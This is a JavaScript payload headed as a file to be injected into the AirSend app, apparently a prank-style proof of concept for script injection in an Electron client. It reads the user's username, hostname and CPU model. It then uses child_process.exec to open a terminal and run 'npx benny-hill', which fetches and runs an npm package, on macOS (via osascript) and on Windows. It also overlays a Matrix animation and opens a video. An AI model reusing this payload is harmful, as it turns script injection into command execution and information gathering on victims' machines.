// File to be injected in airsend

alert("YOU HAVE BEEN HACKED");

if (window && window.process && window.process.type) {

  const os = require('os');

  alert(`Hey ${os.userInfo().username}`);
  alert(`Nice ${os.hostname} machine`);
  alert(`Really good ${os.cpus()[0].model}`);
  alert(`BTW - I have access to the proccess`);

  if (os.type() == "Darwin") {
      alert(`Using Mac... Lucky you! May I ask for your permission...`);
      var cmd = `osascript -e 'tell application "Terminal" to activate' -e 'tell application "Terminal" to do script "npx benny-hill"'`;
      require('child_process').exec(cmd, function (error, stdout, stderr) { console.log(error); });
  } else if (os.type() == "Windows_NT") {
    alert(`Using Windows... Nice and easy...`);
    require('child_process').exec('start cmd /k npx benny-hill', function (error, stdout, stderr) { console.log(error); });
  }

  
}

// Append moment
  const head = document.getElementsByTagName('head')[0];
  const script = document.createElement('script');
  script.type = 'text/javascript';
  script.src = 'https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js';
  head.appendChild(script);

  document.body.style.overflow = 'hidden';

  const canvasToInject = document.createElement('canvas');
  canvasToInject.id = "matrix";
  canvasToInject.style="width:100vw;height:100vh;position:absolute;z-index: 999999999;top: 0;"


  document.body.prepend(canvasToInject);

  // STOLEN PART OF CODE, THANKS MATRIX ANIMATION GUY
  // =====================================================
  var c = document.getElementById("matrix");
  var ctx = c.getContext("2d");

  // making the canvas full screen
  c.height = window.innerHeight;
  c.width = window.innerWidth;

  // the characters
  var gurmukhi = "੧੨੩੪੫੬੭੮੯੦ੳਅਰਤਯਪਸਦਗਹਜਕਲਙੜਚਵਬਨਮੲਥਫਸ਼ਧਘਝਖਲ਼ੜ੍ਹਛਭਣ"
  var sanskrit = "१२३४५६७८९अरतयपसदगहजकलङषचवबनमआथय़फशधघझखळक्षछभणऒ"
  var hanzi = "田由甲申甴电甶男甸甹町画甼甽甾甿畀畁畂畃畄畅畆畇畈畉畊畋界畍畎畏畐畑呂"
  var katakana = "゠クタハムヰアケチヒモヲィコッャンイツヤウゥサフュヵテユヶェショワエトヘヨォスラヱオナリカセニホル・ヌレーキソネロヽノマヮミ"
  var hex = "ABCDEF01234567890"
  // converting the string into an array of single characters
  var characters = (hanzi + katakana + sanskrit + gurmukhi + hex).split("");
  var font_size = 12;
  var columns = c.width/font_size;    // number of columns for the rain

  // an array of drops - one per column
  var drops = [];
  // x below is the x coordinate
  // 1 = y-coordinate of the drop (same for every drop initially)
  for (var x = 0; x < columns; x++)
      drops[x] = 1;

  function getColor() {
      return "rgba(" + moment().format('HH') + ","
                  + moment().format('mm') + ","
                  + moment().format('ss')  + ", 0.05)";
  }

  function getColorHex() {
      return "#" + moment().format('HHmmss');
  }

  // drawing the characters
  function draw() {
      // Get the BG color based on the current time i.e. rgb(hh, mm, ss)
      // translucent BG to show trail
      ctx.fillStyle = getColor();
      ctx.fillRect(0, 0, c.width, c.height);

      ctx.fillStyle = "#BBB"; // grey text
      ctx.font = font_size + "px arial";

      // looping over drops
      for (var i = 0; i < drops.length; i++) {
          // a random character to print
          var text = characters[Math.floor(Math.random() * characters.length)];
          // x = i * font_size, y = value of drops[i] * font_size
          ctx.fillText(text, i * font_size, drops[i] * font_size);

          // sending the drop back to the top randomly after it has crossed the screen
          // adding randomness to the reset to make the drops scattered on the Y axis
          if (drops[i] * font_size > c.height && Math.random() > 0.975)
              drops[i] = 0;

          // Incrementing Y coordinate
          drops[i]++;
      }
  }
  setInterval(draw, 33);

  // =====================================

    setTimeout(function(){
      alert(`I know, it is awesome, best part now...`);
      c.remove()
      window.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ', '_blank');
    }, 8000);  



